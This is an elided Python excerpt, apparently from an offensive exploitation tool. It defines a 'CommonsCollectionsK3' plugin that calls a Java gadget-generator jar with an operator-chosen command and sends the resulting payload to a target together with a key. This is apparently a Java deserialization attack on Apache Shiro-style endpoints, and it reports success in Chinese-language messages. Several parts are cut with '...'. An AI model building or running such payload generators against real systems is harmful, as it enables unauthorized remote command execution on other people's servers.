...
@Idea.plugin_register('Class4:CommonsCollectionsK3')
class CommonsCollectionsK3(object):
    ...
    def generator(self, key, target, command, file_path=JAR_FILE):
        ...
        popen = subprocess.Popen(
            ['java', '-jar', file_path, 'CommonsCollectionsK3', command],
        ...
        try:
            ...
            if resp.status_code == 200:
                print(
                    "[+]CommonsCollectionsK3模块key: {} 已成功发送! 状态码:{}".format(
                        str(key), str(resp.status_code)
                    )
                )
            else:
                print(
                    "[-]CommonsCollectionsK3模块key: {} 发送异常! 状态码:{}".format(
                        str(key), str(resp.status_code)
                    )
                )
        except Exception:
